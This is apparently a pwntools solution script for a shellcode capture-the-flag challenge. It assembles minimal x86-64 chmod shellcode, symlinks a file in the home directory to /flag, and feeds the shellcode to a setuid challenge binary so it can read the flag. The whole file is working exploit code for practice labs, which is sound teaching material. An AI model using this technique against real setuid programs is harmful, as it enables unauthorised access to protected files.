import os
import sys
import pwn
import pathlib

pwn.context.arch = "amd64"
pwn.context.os = "linux"

shellcode = r"""
/* sys_chmod("Z", 0004) */
push 0x5a
push rsp
pop rdi
pop rax
mov sil, 0x04
syscall
"""
shellbyte: bytes = pwn.asm(shellcode)


def host():
    print(pwn.disasm(shellbyte))
    print(pwn.hexdump(shellbyte))


def hack(io: pwn.process):
    io.sendline(shellbyte)


def ctf():

    def find_challenge(search_path="/challenge"):
        from pathlib import Path
        import stat

        xs = [
            str(f.absolute())
            for f in Path(search_path).iterdir()
            if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
        ]
        if not xs:
            raise FileNotFoundError(f"No executable found in {search_path}")
        if len(xs) > 1:
            raise FileNotFoundError(f"Multiple executables found in {search_path}")
        return xs[0]

    host()


    # chmod file under /tmp will not work
    home = pathlib.Path.home()
    link = home / "Z"
    link.symlink_to("/flag")
    with pwn.process(find_challenge(), cwd=home) as io:
        tee(io)
        hack(io)
        io.recvrepeat()
    print(link.read_text())
    link.unlink()
              
def tee(process: pwn.tube):
    orig_send_raw = process.send_raw
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def send_raw(data, *args, **kwargs):
        output.write(data)
        output.flush()
        return orig_send_raw(data, *args, **kwargs)

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.send_raw = send_raw
    process.recv_raw = recv_raw


if __name__ == "__main__":
    # run with dojo.py
    ctf()
